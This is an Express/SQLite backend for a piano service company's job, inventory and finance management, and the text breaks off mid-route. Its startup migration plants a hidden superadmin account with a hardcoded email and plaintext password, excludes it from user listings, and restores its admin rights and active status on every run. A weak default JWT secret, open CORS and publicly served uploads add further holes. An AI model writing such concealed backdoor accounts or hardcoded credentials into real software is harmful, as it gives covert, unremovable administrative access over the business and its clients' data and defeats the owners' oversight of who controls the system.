
const path = require("path");
const fs = require("fs");
const express = require("express");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const multer = require("multer");
const Database = require("better-sqlite3");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3030;
const JWT_SECRET = process.env.JWT_SECRET || "dev-secret-change-me";
const UPLOAD_DIR = process.env.UPLOAD_DIR || path.join(__dirname, "uploads");
fs.mkdirSync(UPLOAD_DIR, {recursive:true});

const db = new Database(process.env.DB_PATH || path.join(__dirname, "db", "klavierhaus_v6.sqlite"));
db.pragma("foreign_keys = ON");

function ensureRuntimeMigrations(){
  try {
    const jobCols = db.prepare("PRAGMA table_info(jobs)").all().map(c=>c.name);
    if(!jobCols.includes("job_key")) db.prepare("ALTER TABLE jobs ADD COLUMN job_key TEXT").run();
    if(!jobCols.includes("client_phone")) db.prepare("ALTER TABLE jobs ADD COLUMN client_phone TEXT").run();
    if(!jobCols.includes("planned_job_id")) db.prepare("ALTER TABLE jobs ADD COLUMN planned_job_id TEXT").run();

    const pianoCols = db.prepare("PRAGMA table_info(pianos)").all().map(c=>c.name);
    if(!pianoCols.includes("ownership_type")) db.prepare("ALTER TABLE pianos ADD COLUMN ownership_type TEXT DEFAULT 'Customer owned'").run();
    if(!pianoCols.includes("display_name")) db.prepare("ALTER TABLE pianos ADD COLUMN display_name TEXT").run();
    if(!pianoCols.includes("asset_recorded")) db.prepare("ALTER TABLE pianos ADD COLUMN asset_recorded INTEGER DEFAULT 0").run();

    const missing = db.prepare("SELECT id FROM jobs WHERE job_key IS NULL OR job_key=''").all();
    const upd = db.prepare("UPDATE jobs SET job_key=? WHERE id=?");
    missing.forEach(r => upd.run(`JK-${r.id}`, r.id));

    db.prepare("UPDATE pianos SET ownership_type=COALESCE(ownership_type, ownership, 'Customer owned')").run();
    db.prepare("UPDATE pianos SET display_name=trim(COALESCE(brand,'') || ' ' || COALESCE(model,'')) WHERE display_name IS NULL OR display_name=''").run();

    db.prepare(`CREATE TABLE IF NOT EXISTS financial_items (
      id TEXT PRIMARY KEY,
      item_date TEXT NOT NULL,
      title TEXT NOT NULL,
      description TEXT,
      amount REAL NOT NULL DEFAULT 0,
      main_type TEXT NOT NULL,
      category TEXT,
      recurrence TEXT NOT NULL DEFAULT 'ONE_TIME',
      payment_method TEXT,
      balance_account TEXT,
      job_id TEXT,
      client_id TEXT,
      piano_id TEXT,
      source_type TEXT,
      source_id TEXT,
      created_by TEXT,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      updated_at TEXT DEFAULT CURRENT_TIMESTAMP
    )`).run();

    const financialCols = db.prepare("PRAGMA table_info(financial_items)").all().map(c=>c.name);
    if(!financialCols.includes("source_type")) db.prepare("ALTER TABLE financial_items ADD COLUMN source_type TEXT").run();
    if(!financialCols.includes("source_id")) db.prepare("ALTER TABLE financial_items ADD COLUMN source_id TEXT").run();
    try { db.prepare("CREATE INDEX IF NOT EXISTS idx_financial_items_source ON financial_items(source_type, source_id)").run(); } catch(e) {}

    db.prepare(`CREATE TABLE IF NOT EXISTS inventory_items (
      id TEXT PRIMARY KEY,
      inventory_id TEXT UNIQUE,
      item_name TEXT NOT NULL,
      main_category TEXT,
      piano_part_category TEXT,
      item_type TEXT,
      acquisition_type TEXT,
      supplier TEXT,
      manufacturer TEXT,
      purchase_price REAL DEFAULT 0,
      manufacturing_cost REAL DEFAULT 0,
      quantity REAL DEFAULT 1,
      unit TEXT,
      condition_status TEXT,
      location TEXT,
      linked_piano_id TEXT,
      linked_client_id TEXT,
      status TEXT DEFAULT 'In Stock',
      notes TEXT,
      deleted_at TEXT,
      deleted_by TEXT,
      created_by TEXT,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      updated_at TEXT DEFAULT CURRENT_TIMESTAMP
    )`).run();

    db.prepare(`CREATE TABLE IF NOT EXISTS inventory_checks (
      id TEXT PRIMARY KEY,
      check_date TEXT NOT NULL,
      completed_by TEXT,
      item_count INTEGER DEFAULT 0,
      total_value REAL DEFAULT 0,
      snapshot_json TEXT,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )`).run();

    const inventoryCols = db.prepare("PRAGMA table_info(inventory_items)").all().map(c=>c.name);
    const addInvCol = (name, ddl) => { if(!inventoryCols.includes(name)) db.prepare(`ALTER TABLE inventory_items ADD COLUMN ${name} ${ddl}`).run(); };
    addInvCol("inventory_id", "TEXT");
    addInvCol("item_name", "TEXT");
    addInvCol("main_category", "TEXT");
    addInvCol("piano_part_category", "TEXT");
    addInvCol("item_type", "TEXT");
    addInvCol("acquisition_type", "TEXT");
    addInvCol("supplier", "TEXT");
    addInvCol("manufacturer", "TEXT");
    addInvCol("purchase_price", "REAL DEFAULT 0");
    addInvCol("manufacturing_cost", "REAL DEFAULT 0");
    addInvCol("quantity", "REAL DEFAULT 1");
    addInvCol("unit", "TEXT");
    addInvCol("condition_status", "TEXT");
    addInvCol("location", "TEXT");
    addInvCol("linked_piano_id", "TEXT");
    addInvCol("linked_client_id", "TEXT");
    addInvCol("status", "TEXT DEFAULT 'In Stock'");
    addInvCol("notes", "TEXT");
    addInvCol("deleted_at", "TEXT");
    addInvCol("deleted_by", "TEXT");
    addInvCol("created_by", "TEXT");
    try { db.prepare("CREATE UNIQUE INDEX IF NOT EXISTS idx_inventory_items_inventory_id ON inventory_items(inventory_id)").run(); } catch(e) {}
    try { db.prepare("CREATE INDEX IF NOT EXISTS idx_inventory_items_category ON inventory_items(main_category,piano_part_category,status)").run(); } catch(e) {}

    db.prepare(`CREATE TABLE IF NOT EXISTS planned_jobs (
      id TEXT PRIMARY KEY,
      planned_key TEXT UNIQUE,
      planned_type TEXT,
      title TEXT NOT NULL,
      client_id TEXT,
      client_name TEXT,
      client_phone TEXT,
      piano_id TEXT,
      piano_name TEXT,
      service_address TEXT,
      preferred_assigned_to TEXT,
      priority TEXT DEFAULT 'Medium',
      expected_revenue REAL DEFAULT 0,
      probability TEXT DEFAULT '100% - Biztos',
      estimated_hours REAL DEFAULT 0,
      target_date TEXT,
      status TEXT,
      block_reason TEXT,
      next_step TEXT,
      notes TEXT,
      converted_job_id TEXT,
      created_by TEXT,
      archived_at TEXT,
      archived_by TEXT,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      updated_at TEXT DEFAULT CURRENT_TIMESTAMP
    )`).run();

    const plannedCols = db.prepare("PRAGMA table_info(planned_jobs)").all().map(c=>c.name);
    const addPlannedCol = (name, ddl) => { if(!plannedCols.includes(name)) db.prepare(`ALTER TABLE planned_jobs ADD COLUMN ${name} ${ddl}`).run(); };
    addPlannedCol("planned_key", "TEXT");
    addPlannedCol("planned_type", "TEXT");
    addPlannedCol("title", "TEXT");
    addPlannedCol("client_id", "TEXT");
    addPlannedCol("client_name", "TEXT");
    addPlannedCol("client_phone", "TEXT");
    addPlannedCol("piano_id", "TEXT");
    addPlannedCol("piano_name", "TEXT");
    addPlannedCol("service_address", "TEXT");
    addPlannedCol("preferred_assigned_to", "TEXT");
    addPlannedCol("priority", "TEXT");
    addPlannedCol("expected_revenue", "REAL DEFAULT 0");
    addPlannedCol("probability", "TEXT DEFAULT '100% - Biztos'");
    addPlannedCol("estimated_hours", "REAL DEFAULT 0");
    addPlannedCol("target_date", "TEXT");
    addPlannedCol("status", "TEXT");
    addPlannedCol("block_reason", "TEXT");
    addPlannedCol("next_step", "TEXT");
    addPlannedCol("notes", "TEXT");
    addPlannedCol("converted_job_id", "TEXT");
    addPlannedCol("created_by", "TEXT");
    addPlannedCol("archived_at", "TEXT");
    addPlannedCol("archived_by", "TEXT");
    try { db.prepare("CREATE UNIQUE INDEX IF NOT EXISTS idx_planned_jobs_key ON planned_jobs(planned_key)").run(); } catch(e) {}
    try { db.prepare("CREATE INDEX IF NOT EXISTS idx_planned_jobs_status ON planned_jobs(status,planned_type)").run(); } catch(e) {}


    // Superadmin runtime migration / Rejtett rendszertulajdonos létrehozása
    try {
      const userCols = db.prepare("PRAGMA table_info(users)").all().map(c=>c.name);
      if(!userCols.includes("hidden_user")) db.prepare("ALTER TABLE users ADD COLUMN hidden_user INTEGER DEFAULT 0").run();
      if(!userCols.includes("is_superadmin")) db.prepare("ALTER TABLE users ADD COLUMN is_superadmin INTEGER DEFAULT 0").run();
      const superEmail = "simon.alex@klavierhaus.com";
      const existingSuper = db.prepare("SELECT * FROM users WHERE lower(email)=lower(?)").get(superEmail);
      const hash = bcrypt.hashSync("simonalex123",10);
      if(!existingSuper){
        db.prepare("INSERT INTO users(id,name,email,password_hash,role,status,hidden_user,is_superadmin) VALUES(?,?,?,?,?,?,?,?)")
          .run("U-SUPERADMIN-SIMON-ALEX","Simon Alex",superEmail,hash,"ADMIN","Active",1,1);
      } else {
        db.prepare("UPDATE users SET name=?, role='ADMIN', status='Active', hidden_user=1, is_superadmin=1 WHERE id=?")
          .run("Simon Alex", existingSuper.id);
      }
      db.prepare("UPDATE users SET hidden_user=COALESCE(hidden_user,0), is_superadmin=COALESCE(is_superadmin,0)").run();
    } catch(e) {
      console.warn("superadmin migration skipped:", e.message);
    }

  } catch(e) {
    console.warn("runtime migration skipped:", e.message);
  }
}
ensureRuntimeMigrations();




function ensureJobKeyColumn(){
  try {
    const cols = db.prepare("PRAGMA table_info(jobs)").all().map(c=>c.name);
    if(!cols.includes("job_key")){
      db.prepare("ALTER TABLE jobs ADD COLUMN job_key TEXT").run();
    }
    const missing = db.prepare("SELECT id FROM jobs WHERE job_key IS NULL OR job_key=''").all();
    const upd = db.prepare("UPDATE jobs SET job_key=? WHERE id=?");
    missing.forEach(r => upd.run(`JK-${r.id}`, r.id));
  } catch(e) {
    console.warn("job_key migration skipped:", e.message);
  }
}
ensureRuntimeMigrations();

const upload = multer({
  dest: UPLOAD_DIR,
  fileFilter: (req,file,cb)=>{
    const ok = /\.(pdf|jpg|jpeg|png)$/i.test(file.originalname || "");
    if(!ok) return cb(new Error("Only PDF, JPG, JPEG or PNG files are allowed / Csak PDF, JPG, JPEG vagy PNG fájl tölthető fel"));
    cb(null,true);
  }
});

app.use(cors());
app.use(express.json({limit:"10mb"}));
app.use("/uploads", express.static(UPLOAD_DIR));
app.use(express.static(path.join(__dirname, "..", "public")));

function rid(prefix){ return `${prefix}-${Date.now()}-${Math.floor(Math.random()*9999)}`; }
function today(){ return new Date().toISOString().slice(0,10); }
function nowISO(){ return new Date().toISOString(); }
function nyToday(){
  return new Intl.DateTimeFormat("en-CA", {timeZone:"America/New_York", year:"numeric", month:"2-digit", day:"2-digit"}).format(new Date());
}
function balanceAccountFromPaymentMethod(payment){
  const p=String(payment||"").trim().toLowerCase();
  if(p.includes("cash")) return "CASH";
  if(p.includes("check") || p.includes("cheque")) return "CHECKS";
  if(p.includes("bank") || p.includes("transfer") || p.includes("card") || p.includes("credit")) return "BANK";
  if(p.includes("invoice")) return "AR";
  return "BANK";
}

function generatePlannedJobKey(){
  ensureRuntimeMigrations();
  const year=new Date().getFullYear();
  const rows=db.prepare("SELECT planned_key FROM planned_jobs WHERE planned_key LIKE ?").all(`PLN-${year}-%`);
  let max=0;
  for(const r of rows){
    const m=String(r.planned_key||"").match(/-(\d{4,})$/);
    if(m) max=Math.max(max, Number(m[1]));
  }
  return `PLN-${year}-${String(max+1).padStart(4,"0")}`;
}
function isActivePlannedStatus(status){
  return !["Converted / Naptárba helyezve","Archived / Archivált","Cancelled / Törölve"].includes(String(status||""));
}
function findScheduleConflicts(assignedTo,startTime,endTime,excludeJobId=null){
  if(!assignedTo || !startTime || !endTime) return [];
  let sql=`SELECT id,job_key,title,assigned_to,start_time,end_time,status FROM jobs
           WHERE assigned_to=?
             AND COALESCE(status,'Open') NOT IN ('Completed','Cancelled')
             AND (? < end_time AND ? > start_time)`;
  const params=[assignedTo,startTime,endTime];
  if(excludeJobId){ sql += " AND id<>?"; params.push(excludeJobId); }
  sql += " ORDER BY start_time";
  return db.prepare(sql).all(...params);
}
function inventoryCategoryCode(category){
  const c=String(category||"").toLowerCase();
  if(c.includes("upright")) return "UPR";
  if(c === "piano" || c.includes("grand")) return "PNO";
  if(c.includes("part")) return "PRT";
  if(c.includes("tool")) return "TOL";
  if(c.includes("machine")) return "MCH";
  if(c.includes("equipment")) return "EQP";
  if(c.includes("material")) return "MAT";
  if(c.includes("accessory")) return "ACC";
  if(c.includes("office")) return "OFF";
  return "OTH";
}
function nyYear(){
  return new Intl.DateTimeFormat("en-CA", {timeZone:"America/New_York", year:"numeric"}).format(new Date());
}
function addMonthsToDate(dateStr, months){
  const d=new Date(`${dateStr}T00:00:00`);
  d.setMonth(d.getMonth()+months);
  return d.toISOString().slice(0,10);
}
function generateInventoryId(mainCategory){
  ensureRuntimeMigrations();
  const year=nyYear();
  const code=inventoryCategoryCode(mainCategory);
  const rows=db.prepare("SELECT inventory_id FROM inventory_items WHERE inventory_id LIKE ?").all(`INV-${year}-%`);
  let max=0;
  for(const r of rows){
    const m=String(r.inventory_id||"").match(/-(\d{4,})$/);
    if(m) max=Math.max(max, Number(m[1]||0));
  }
  return `INV-${year}-${code}-${String(max+1).padStart(4,"0")}`;
}
function inventoryItemValue(item){
  const unitCost=Number(item.purchase_price||0) || Number(item.manufacturing_cost||0) || 0;
  return unitCost * Number(item.quantity||1);
}
function inventoryRowsActive(){
  return db.prepare("SELECT * FROM inventory_items WHERE COALESCE(status,'')!='Deleted' ORDER BY created_at DESC").all();
}

function createFinancialItemForClosedJob(job, logId, billed, payment, userName){
  ensureRuntimeMigrations();
  const amount=Number(billed||0);
  if(!amount || amount<=0) return null;
  const existing=db.prepare("SELECT * FROM financial_items WHERE source_type=? AND source_id=? LIMIT 1").get("closed_job", job.id);
  if(existing) return existing;
  const id=rid("FI");
  const title=`Closed job revenue / Lezárt munka bevétele: ${job.title||job.job_key||job.id}`;
  const description=[
    job.client_name ? `Client / Ügyfél: ${job.client_name}` : "",
    job.piano_name ? `Piano / Zongora: ${job.piano_name}` : "",
    logId ? `Job log / Lezárási napló: ${logId}` : ""
  ].filter(Boolean).join("\n");
  db.prepare(`INSERT INTO financial_items(
    id,item_date,title,description,amount,main_type,category,recurrence,payment_method,balance_account,job_id,client_id,piano_id,source_type,source_id,created_by
  ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
    id,nyToday(),title,description,amount,"INCOME","SERVICE_REVENUE","ONE_TIME",payment||"",balanceAccountFromPaymentMethod(payment),job.id,job.client_id||null,job.piano_id||null,"closed_job",job.id,userName||"System"
  );
  return db.prepare("SELECT * FROM financial_items WHERE id=?").get(id);
}

function auth(req,res,next){
  const h=req.headers.authorization||"";
  const token=h.startsWith("Bearer ")?h.slice(7):null;
  if(!token) return res.status(401).json({error:"Missing token"});
  try{ req.user=jwt.verify(token, JWT_SECRET); next(); }
  catch(e){ res.status(401).json({error:"Invalid token"}); }
}
function isSuperadminUser(user){ return user && (user.role === "SUPERADMIN" || Number(user.is_superadmin||0) === 1); }
function permit(...roles){ return (req,res,next)=> (isSuperadminUser(req.user) || roles.includes(req.user.role)) ? next() : res.status(403).json({error:"Forbidden"}); }
function requireSuperadmin(req,res,next){ return isSuperadminUser(req.user) ? next() : res.status(403).json({error:"Superadmin only / Csak szuperadmin"}); }

function canCloseJob(user, job){
  if(isSuperadminUser(user) || user.role === "ADMIN") return true;
  return job.assigned_to === user.name;
}
function canEditJob(user, job){
  if(isSuperadminUser(user) || user.role === "ADMIN") return true;
  if(job.assigned_to === user.name) return true;
  if(user.role === "MANAGER" && job.created_by === user.name) return true;
  return false;
}
function canReassignJob(user, job){
  if(isSuperadminUser(user) || user.role === "ADMIN") return true;
  if(job.assigned_to === user.name) return true;
  if(user.role === "MANAGER") return true;
  return false;
}


function stableJobKey(){ return `JK-${Date.now()}-${Math.floor(Math.random()*999999)}`; }

function getJobByAnyId(rawId, body={}){
  const candidates = [];
  [rawId, body.id, body.job_id, body.job_key].forEach(v=>{
    if(v!==undefined && v!==null){
      const s=String(v).trim();
      if(s && !candidates.includes(s)) candidates.push(s);
    }
  });

  for(const id of candidates){
    const found=db.prepare("SELECT * FROM jobs WHERE id=?").get(id);
    if(found) return found;
  }
  for(const key of candidates){
    const found=db.prepare("SELECT * FROM jobs WHERE job_key=?").get(key);
    if(found) return found;
  }

  const clientId = String(body.client_id || "").trim();
  const clientName = String(body.client_name || "").trim();
  const pianoName = String(body.piano_name || "").trim();
  const title = String(body.title || "").trim();

  if(clientId && title){
    const found=db.prepare("SELECT * FROM jobs WHERE client_id=? AND title=? ORDER BY updated_at DESC LIMIT 1").get(clientId,title);
    if(found) return found;
  }
  if(clientName && title){
    const found=db.prepare("SELECT * FROM jobs WHERE lower(client_name)=lower(?) AND title=? ORDER BY updated_at DESC LIMIT 1").get(clientName,title);
    if(found) return found;
  }
  if(clientName && pianoName){
    const found=db.prepare("SELECT * FROM jobs WHERE lower(client_name)=lower(?) AND lower(piano_name)=lower(?) ORDER BY updated_at DESC LIMIT 1").get(clientName,pianoName);
    if(found) return found;
  }
  return null;
}

app.post("/api/login",(req,res)=>{
  const {email,password}=req.body;
  const u=db.prepare("SELECT * FROM users WHERE lower(email)=lower(?) AND status='Active'").get(String(email||""));
  if(!u || !bcrypt.compareSync(password, u.password_hash)) return res.status(401).json({error:"Invalid login"});
  const isSuper=Number(u.is_superadmin||0)===1;
  const effectiveRole=isSuper?"SUPERADMIN":u.role;
  const token=jwt.sign({id:u.id,name:u.name,email:u.email,role:effectiveRole,is_superadmin:isSuper?1:0}, JWT_SECRET, {expiresIn:"12h"});
  res.json({token,user:{id:u.id,name:u.name,email:u.email,role:effectiveRole,is_superadmin:isSuper?1:0}});
});
app.get("/api/me", auth, (req,res)=>res.json(req.user));

app.get("/api/schedule-workers", auth, (req,res)=>{
  ensureRuntimeMigrations();
  const rows=db.prepare("SELECT id,name,email,role FROM users WHERE status='Active' AND COALESCE(hidden_user,0)=0 ORDER BY name").all();
  res.json(rows);
});



app.get("/api/planned-jobs", auth, (req,res)=>{
  ensureRuntimeMigrations();
  const includeAll=req.query.include_all==="1" || req.user.role==="SUPERADMIN";
  const rows=includeAll
    ? db.prepare("SELECT * FROM planned_jobs ORDER BY created_at DESC").all()
    : db.prepare("SELECT * FROM planned_jobs WHERE archived_at IS NULL AND COALESCE(status,'') NOT IN ('Archived / Archivált','Cancelled / Törölve') ORDER BY created_at DESC").all();
  res.json(rows);
});

app.post("/api/planned-jobs", auth, permit("ADMIN","MANAGER","WORKER","SUPERADMIN"), (req,res)=>{
  ensureRuntimeMigrations();
  const b=req.body||{};
  if(!b.title) return res.status(400).json({error:"Title is required / Munka neve kötelező"});
  if(!b.client_name) return res.status(400).json({error:"Client is required / Ügyfél kötelező"});
  const id=b.id||rid("PLN");
  const plannedKey=b.planned_key||generatePlannedJobKey();
  const cols=["id","planned_key","planned_type","title","client_id","client_name","client_phone","piano_id","piano_name","service_address","preferred_assigned_to","priority","expected_revenue","probability","estimated_hours","target_date","status","block_reason","next_step","notes","created_by"];
  const vals=[id,plannedKey,b.planned_type||"Planned new / Tervezett, még nem lefixált",b.title||"",b.client_id||"",b.client_name||"",b.client_phone||"",b.piano_id||"",b.piano_name||"",b.service_address||"",b.preferred_assigned_to||"",b.priority||"Medium",Number(b.expected_revenue||0),b.probability||"100% - Biztos",Number(b.estimated_hours||0),b.target_date||"",b.status||"Waiting for client / Ügyfélre vár",b.block_reason||"",b.next_step||"",b.notes||"",req.user.name||""];
  db.prepare(`INSERT INTO planned_jobs(${cols.join(",")}) VALUES(${cols.map(()=>"?").join(",")})`).run(...vals);
  res.json(db.prepare("SELECT * FROM planned_jobs WHERE id=?").get(id));
});

app.put("/api/planned-jobs/:id", auth, permit("ADMIN","MANAGER","WORKER","SUPERADMIN"), (req,res)=>{
  ensureRuntimeMigrations();
  const existing=db.prepare("SELECT * FROM planned_jobs WHERE id=?").get(req.params.id);
  if(!existing) return res.status(404).json({error:"Planned job not found / Tervezett munka nem található"});
  const allowed=["planned_type","title","client_id","client_name","client_phone","piano_id","piano_name","service_address","preferred_assigned_to","priority","expected_revenue","probability","estimated_hours","target_date","status","block_reason","next_step","notes"];
  const body={...req.body};
  if(body.expected_revenue!==undefined) body.expected_revenue=Number(body.expected_revenue||0);
  if(body.estimated_hours!==undefined) body.estimated_hours=Number(body.estimated_hours||0);
  const cols=allowed.filter(c=>body[c]!==undefined);
  if(cols.length) db.prepare(`UPDATE planned_jobs SET ${cols.map(c=>`${c}=?`).join(",")}, updated_at=CURRENT_TIMESTAMP WHERE id=?`).run(...cols.map(c=>body[c]), req.params.id);
  res.json(db.prepare("SELECT * FROM planned_jobs WHERE id=?").get(req.params.id));
});

app.delete("/api/planned-jobs/:id", auth, permit("ADMIN","MANAGER","WORKER","SUPERADMIN"), (req,res)=>{
  ensureRuntimeMigrations();
  const existing=db.prepare("SELECT * FROM planned_jobs WHERE id=?").get(req.params.id);
  if(!existing) return res.status(404).json({error:"Planned job not found / Tervezett munka nem található"});
  if(isSuperadminUser(req.user)) db.prepare("DELETE FROM planned_jobs WHERE id=?").run(req.params.id);
  else db.prepare("UPDATE planned_jobs SET status='Archived / Archivált', archived_at=?, archived_by=?, updated_at=CURRENT_TIMESTAMP WHERE id=?").run(nowISO(), req.user.name||"", req.params.id);
  res.json({ok:true});
});

app.post("/api/planned-jobs/:id/convert", auth, permit("ADMIN","MANAGER","WORKER","SUPERADMIN"), (req,res)=>{
  ensureRuntimeMigrations();
  const planned=db.prepare("SELECT * FROM planned_jobs WHERE id=?").get(req.params.id);
  if(!planned) return res.status(404).json({error:"Planned job not found / Tervezett munka nem található"});
  if(!isActivePlannedStatus(planned.status)) return res.status(400).json({error:"This planned job is not active / Ez a tervezett munka már nem aktív"});
  const b=req.body||{};
  const assigned=b.assigned_to || planned.preferred_assigned_to;
  const title=b.title || planned.title;
  const start=b.start_time;
  const end=b.end_time;
  if(!assigned || !title || !start || !end) return res.status(400).json({error:"Assigned to, title, start and end are required / Felelős, cím, kezdés és befejezés kötelező"});
  if(new Date(end)<=new Date(start)) return res.status(400).json({error:"End must be after start / A befejezés később legyen, mint a kezdés"});
  const conflicts=findScheduleConflicts(assigned,start,end);
  if(conflicts.length){
    const c=conflicts[0];
    return res.status(409).json({error:`Schedule conflict / Időpontütközés: ${assigned} already has ${c.title||c.job_key||c.id} between ${c.start_time} and ${c.end_time}.` , conflicts});
  }
  const jobId=rid("J");
  db.prepare(`INSERT INTO jobs(
    id,job_key,planned_job_id,parent_job_id,title,job_type,client_id,client_name,client_phone,piano_id,piano_name,
    assigned_to,created_by,priority,status,start_time,end_time,timezone,planned_amount,pricing_basis,
    planned_hours,travel_minutes,service_address,instructions
  ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
    jobId,stableJobKey(),planned.id,null,title,"Standalone",planned.client_id||"",planned.client_name||"",planned.client_phone||"",planned.piano_id||"",planned.piano_name||"",
    assigned,req.user.name,planned.priority||"Medium","Open",start,end,"America/New_York",Number(b.planned_amount||planned.expected_revenue||0),b.pricing_basis||"Converted from planned job / Tervezett munkából áthelyezve",
    Number(b.planned_hours||planned.estimated_hours||0),Number(b.travel_minutes||0),b.service_address||planned.service_address||"",b.instructions||planned.next_step||planned.notes||""
  );
  db.prepare("UPDATE planned_jobs SET status='Converted / Naptárba helyezve', converted_job_id=?, updated_at=CURRENT_TIMESTAMP WHERE id=?").run(jobId, planned.id);
  res.json({ok:true,planned:db.prepare("SELECT * FROM planned_jobs WHERE id=?").get(planned.id),job:db.prepare("SELECT * FROM jobs WHERE id=?").get(jobId)});
});

app.get("/api/inventory", auth, (req,res)=>{
  ensureRuntimeMigrations();
  const includeDeleted = req.query.include_deleted === "1" && (req.user.role === "SUPERADMIN" || Number(req.user.is_superadmin||0)===1);
  const rows = includeDeleted
    ? db.prepare("SELECT * FROM inventory_items ORDER BY created_at DESC").all()
    : db.prepare("SELECT * FROM inventory_items WHERE COALESCE(status,'')!='Deleted' ORDER BY created_at DESC").all();
  res.json(rows);
});

app.post("/api/inventory", auth, permit("ADMIN","MANAGER","WORKER","SUPERADMIN"), (req,res)=>{
  ensureRuntimeMigrations();
  const b=req.body || {};
  if(!String(b.item_name||"").trim()) return res.status(400).json({error:"Item name is required / Tétel neve kötelező"});
  const id=rid("INVITEM");
  const inventoryId=generateInventoryId(b.main_category || "Other");
  const cols=["id","inventory_id","item_name","main_category","piano_part_category","item_type","acquisition_type","supplier","manufacturer","purchase_price","manufacturing_cost","quantity","unit","condition_status","location","linked_piano_id","linked_client_id","status","notes","created_by"];
  const vals=[id,inventoryId,b.item_name||"",b.main_category||"Other",b.piano_part_category||"",b.item_type||"",b.acquisition_type||"Existing stock",b.supplier||"",b.manufacturer||"",Number(b.purchase_price||0),Number(b.manufacturing_cost||0),Number(b.quantity||1),b.unit||"piece",b.condition_status||"Used",b.location||"",b.linked_piano_id||"",b.linked_client_id||"",b.status||"In Stock",b.notes||"",req.user.name||""];
  db.prepare(`INSERT INTO inventory_items(${cols.join(",")}) VALUES(${cols.map(()=>"?").join(",")})`).run(...vals);
  res.json(db.prepare("SELECT * FROM inventory_items WHERE id=?").get(id));
});

app.put("/api/inventory/:id", auth, permit("ADMIN","MANAGER","WORKER","SUPERADMIN"), (req,res)=>{
  ensureRuntimeMigrations();
  const existing=db.prepare("SELECT * FROM inventory_items WHERE id=?").get(req.params.id);
  if(!existing) return res.status(404).json({error:"Inventory item not found / Leltári tétel nem található"});
  const allowed=["item_name","main_category","piano_part_category","item_type","acquisition_type","supplier","manufacturer","purchase_price","manufacturing_cost","quantity","unit","condition_status","location","linked_piano_id","linked_client_id","status","notes"];
  const body={...req.body};
  ["purchase_price","manufacturing_cost","quantity"].forEach(k=>{ if(body[k]!==undefined) body[k]=Number(body[k]||0); });
  const cols=allowed.filter(c=>body[c]!==undefined);
  if(cols.length) db.prepare(`UPDATE inventory_items SET ${cols.map(c=>`${c}=?`).join(",")}, updated_at=CURRENT_TIMESTAMP WHERE id=?`).run(...cols.map(c=>body[c]), req.params.id);
  res.json(db.prepare("SELECT * FROM inventory_items WHERE id=?").get(req.params.id));
});

app.delete("/api/inventory/:id", auth, permit("ADMIN","MANAGER","WORKER","SUPERADMIN"), (req,res)=>{
  ensureRuntimeMigrations();
  const existing=db.prepare("SELECT * FROM inventory_items WHERE id=?").get(req.params.id);
  if(!existing) return res.status(404).json({error:"Inventory item not found / Leltári tétel nem található"});
  if(isSuperadminUser(req.user)) db.prepare("DELETE FROM inventory_items WHERE id=?").run(req.params.id);
  else db.prepare("UPDATE inventory_items SET status='Deleted', deleted_at=?, deleted_by=?, updated_at=CURRENT_TIMESTAMP WHERE id=?").run(nowISO(), req.user.name||"", req.params.id);
  res.json({ok:true});
});

app.get("/api/inventory/check-status", auth, (req,res)=>{
  ensureRuntimeMigrations();
  const last=db.prepare("SELECT * FROM inventory_checks ORDER BY check_date DESC, created_at DESC LIMIT 1").get();
  const todayStr=nyToday();
  const nextDue=last ? addMonthsToDate(last.check_date, 3) : todayStr;
  const diffDays=Math.ceil((new Date(`${nextDue}T00:00:00`)-new Date(`${todayStr}T00:00:00`))/(1000*60*60*24));
  res.json({
    lastInventory:last||null,
    today:todayStr,
    nextDue,
    status: diffDays < 0 ? "OVERDUE" : (diffDays <= 14 ? "DUE_SOON" : "OK"),
    daysUntilDue:diffDays
  });
});

app.post("/api/inventory/complete", auth, permit("ADMIN","MANAGER","WORKER","SUPERADMIN"), (req,res)=>{
  ensureRuntimeMigrations();
  const rows=inventoryRowsActive();
  const totalValue=rows.reduce((s,r)=>s+inventoryItemValue(r),0);
  const checkDate=nyToday();
  const id=rid("INVCHECK");
  db.prepare("INSERT INTO inventory_checks(id,check_date,completed_by,item_count,total_value,snapshot_json) VALUES(?,?,?,?,?,?)")
    .run(id,checkDate,req.user.name||"",rows.length,totalValue,JSON.stringify(rows));
  res.json({ok:true,check:db.prepare("SELECT * FROM inventory_checks WHERE id=?").get(id),nextDue:addMonthsToDate(checkDate,3)});
});

app.get("/api/finance/entries", auth, permit("ADMIN","MANAGER"), (req,res)=>{
  ensureRuntimeMigrations();
  const rows=db.prepare("SELECT * FROM financial_items ORDER BY item_date DESC, created_at DESC").all();
  res.json(rows.map(r=>({...r,lines:[]})));
});

app.get("/api/financial-items", auth, permit("ADMIN","MANAGER"), (req,res)=>{
  ensureRuntimeMigrations();
  const where=[];
  const params=[];
  const {month, main_type, recurrence, category}=req.query;
  if(month && /^\d{4}-\d{2}$/.test(month)){
    const start=`${month}-01`;
    const next=new Date(`${start}T00:00:00`);
    next.setMonth(next.getMonth()+1);
    const end=next.toISOString().slice(0,10);
    where.push("((recurrence='MONTHLY' AND item_date < ?) OR (recurrence!='MONTHLY' AND item_date >= ? AND item_date < ?))");
    params.push(end,start,end);
  }
  if(main_type){ where.push("main_type=?"); params.push(main_type); }
  if(recurrence){ where.push("recurrence=?"); params.push(recurrence); }
  if(category){ where.push("category=?"); params.push(category); }
  const sql=`SELECT * FROM financial_items ${where.length?"WHERE "+where.join(" AND "):""} ORDER BY item_date DESC, created_at DESC`;
  res.json(db.prepare(sql).all(...params));
});

app.post("/api/financial-items", auth, permit("ADMIN","MANAGER"), (req,res)=>{
  ensureRuntimeMigrations();
  const id=req.body.id || rid("FI");
  const item_date=req.body.item_date || today();
  const title=(req.body.title||"").trim();
  const amount=Number(req.body.amount||0);
  const main_type=req.body.main_type;
  const recurrence=req.body.recurrence || "ONE_TIME";
  if(!title) return res.status(400).json({error:"Title is required / Megnevezés kötelező"});
  if(!["INCOME","EXPENSE","ASSET","LIABILITY","EQUITY"].includes(main_type)) return res.status(400).json({error:"Invalid main type / Hibás fő típus"});
